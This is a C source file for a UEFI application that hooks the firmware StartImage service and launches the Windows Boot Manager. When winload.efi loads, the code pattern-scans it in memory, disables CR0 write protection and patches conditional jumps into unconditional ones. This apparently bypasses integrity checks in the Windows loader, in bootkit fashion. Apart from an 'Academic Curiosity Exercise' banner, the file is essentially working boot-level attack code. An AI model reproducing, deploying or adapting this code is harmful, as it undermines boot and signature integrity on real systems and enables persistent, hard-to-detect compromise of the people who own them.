#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/BaseLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/DebugLib.h>
#include <Library/DevicePathLib.h>
#include <Protocol/LoadedImage.h>
#include <Protocol/SimpleFileSystem.h>
#include <Protocol/DevicePath.h>
#include <Protocol/DevicePathToText.h>
#include <Guid/FileInfo.h>

#define WINDOWS_BOOTMGR_PATH L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi"
#define TARGET_LOADER_STR    L"winload.efi"

/* ------------------------------------------------------------------ */
/*  Global state for the ExitBootServices notification                */
/* ------------------------------------------------------------------ */

STATIC EFI_IMAGE_START  gOriginalStartImage = NULL;

/* ------------------------------------------------------------------ */
/*  PatternScan — wildcard-aware signature search                     */
/*                                                                    */
/*  Scans [Base, Base+Size) for Pattern[0..PatternLen) using Mask.    */
STATIC
UINT8 *
PatternScan (
  IN UINT8        *Base,
  IN UINTN         RegionSize,
  IN CONST UINT8  *Pattern,
  IN CONST CHAR8  *Mask,
  IN UINTN         PatternLen
  )
{
  UINTN  i;
  UINTN  j;

  if (PatternLen == 0 || PatternLen > RegionSize) {
    return NULL;
  }

  for (i = 0; i <= RegionSize - PatternLen; i++) {
    for (j = 0; j < PatternLen; j++) {
      //
      // Skip wildcard positions; enforce exact match otherwise.
      //
      if (Mask[j] != '?' && Base[i + j] != Pattern[j]) {
        break;
      }
    }
    if (j == PatternLen) {
      return &Base[i];
    }
  }

  return NULL;
}

/* ------------------------------------------------------------------ */
/*  PatchMemory — overwrite the target bytes with a replacement array */
STATIC
EFI_STATUS
PatchMemory (
  IN OUT UINT8        *Target,
  IN     UINTN         TargetLen,
  IN     CONST UINT8  *Replacement   OPTIONAL,
  IN     UINTN         ReplacementLen
  )
{
  UINTN  Cr0;

  Cr0 = AsmReadCr0 ();
  AsmWriteCr0 (Cr0 & ~((UINTN)1 << 16)); // Clear CR0.WP

  if (Replacement != NULL) {
    CopyMem (Target, Replacement, TargetLen);
  } else {
    SetMem (Target, TargetLen, 0x90);
  }

  AsmWriteCr0 (Cr0); // Restore CR0.WP
  return EFI_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  StartImage Hook                                                   */
/* ------------------------------------------------------------------ */

/**
 * Detour for EFI_BOOT_SERVICES.StartImage.
 * Intercepts the execution of winload.efi to apply memory patches.
 */
STATIC
EFI_STATUS
EFIAPI
StartImage_Hook (
  IN  EFI_HANDLE  ImageHandle,
  OUT UINTN      *ExitDataSize,
  OUT CHAR16    **ExitData OPTIONAL
  )
{
  EFI_STATUS                        Status;
  EFI_LOADED_IMAGE_PROTOCOL        *LoadedImage;
  EFI_DEVICE_PATH_TO_TEXT_PROTOCOL *DevicePathToText;
  CHAR16                           *ImagePathText;
  UINT8                            *Match;

  // Patches
  STATIC CONST UINT8 Patch[]    = { 0xEB }; // jmp (Unconditional Jump)
  STATIC CONST UINT8 PatternA[] = { 0x74, 0x00, 0x33, 0xC0, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC9 };
  STATIC CONST CHAR8 MaskA[]    = "x?xx???x????xxx";
  STATIC CONST UINT8 PatternB[] = { 0x74, 0x00, 0x44, 0x84, 0xE8 };
  STATIC CONST CHAR8 MaskB[]    = "x?xxx";

  // Tombstone markers for post-boot verification
  UINT32 Attributes = EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_NON_VOLATILE;
  UINT8  Marker     = 1;
  EFI_GUID ScannerGuid = { 0x7b50f682, 0x965c, 0x45a9, { 0x99, 0x2d, 0x90, 0x76, 0x04, 0x6e, 0x7f, 0x8a } };

  Status = gBS->HandleProtocol (ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID **)&LoadedImage);
  if (!EFI_ERROR (Status)) {
    Status = gBS->LocateProtocol (&gEfiDevicePathToTextProtocolGuid, NULL, (VOID **)&DevicePathToText);
    if (!EFI_ERROR (Status)) {
      ImagePathText = DevicePathToText->ConvertDevicePathToText (LoadedImage->FilePath, TRUE, FALSE);
      if (ImagePathText != NULL) {
        // Convert to lowercase for case-insensitive comparison
        for (UINTN Index = 0; ImagePathText[Index] != L'\0'; Index++) {
          if (ImagePathText[Index] >= L'A' && ImagePathText[Index] <= L'Z') {
            ImagePathText[Index] = ImagePathText[Index] - L'A' + L'a';
          }
        }
        // Check if we are starting winload.efi
        if (StrStr (ImagePathText, TARGET_LOADER_STR) != NULL) {
          Print (L"[+] Intercepted: %s at 0x%lx\n", TARGET_LOADER_STR, (UINT64)LoadedImage->ImageBase);

          // Apply Pattern A
          Match = PatternScan (LoadedImage->ImageBase, (UINTN)LoadedImage->ImageSize, PatternA, MaskA, sizeof (PatternA));
          if (Match) {
            PatchMemory (Match, 1, Patch, 1);
            gRT->SetVariable (L"ScannerMatchA", &ScannerGuid, Attributes, sizeof (Marker), &Marker);
          }

          // Apply Pattern B
          Match = PatternScan (LoadedImage->ImageBase, (UINTN)LoadedImage->ImageSize, PatternB, MaskB, sizeof (PatternB));
          if (Match) {
            PatchMemory (Match, 1, Patch, 1);
            gRT->SetVariable (L"ScannerMatchB", &ScannerGuid, Attributes, sizeof (Marker), &Marker);
          }
        }
        FreePool (ImagePathText);
      }
    }
  }

  return gOriginalStartImage (ImageHandle, ExitDataSize, ExitData);
}

/* ------------------------------------------------------------------ */
/*  Helper: Launch Boot Manager                                       */
/* ------------------------------------------------------------------ */
STATIC
EFI_STATUS
LaunchDefaultBootManager (
  IN EFI_HANDLE ImageHandle
  )
{
  EFI_STATUS                Status;
  UINTN                     HandleCount;
  EFI_HANDLE               *Handles;
  EFI_DEVICE_PATH_PROTOCOL *FilePath;
  EFI_HANDLE                NewImageHandle;
  UINTN                     i;

  Status = gBS->LocateHandleBuffer (ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &HandleCount, &Handles);
  if (EFI_ERROR (Status)) return Status;

  for (i = 0; i < HandleCount; i++) {
    FilePath = FileDevicePath (Handles[i], WINDOWS_BOOTMGR_PATH);
    if (FilePath == NULL) continue;

    Status = gBS->LoadImage (FALSE, ImageHandle, FilePath, NULL, 0, &NewImageHandle);
    if (!EFI_ERROR (Status)) {
      Print (L"[*] Launching Windows Boot Manager...\n");
      return gBS->StartImage (NewImageHandle, NULL, NULL);
    }
  }

  return EFI_NOT_FOUND;
}

/* ------------------------------------------------------------------ */
/*  Application entry point                                           */
/* ------------------------------------------------------------------ */
EFI_STATUS
EFIAPI
UefiMain (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS Status;

  Print (L"[UefiPatternScanner] Academic Curiosity Exercise Started\n");

  // Step 1: Hook StartImage
  gOriginalStartImage = gBS->StartImage;
  gBS->StartImage     = StartImage_Hook;
  gBS->Hdr.CRC32      = 0;
  gBS->CalculateCrc32 (gBS, gBS->Hdr.HeaderSize, &gBS->Hdr.CRC32);

  Print (L"[*] StartImage hook installed.\n");

  // Step 2: Launch Windows Boot Manager to continue normal boot flow
  Status = LaunchDefaultBootManager (ImageHandle);
  if (EFI_ERROR (Status)) {
    Print (L"[-] Failed to launch Boot Manager: %r\n", Status);
    gBS->StartImage = gOriginalStartImage;
    return Status;
  }

  return EFI_SUCCESS;
}
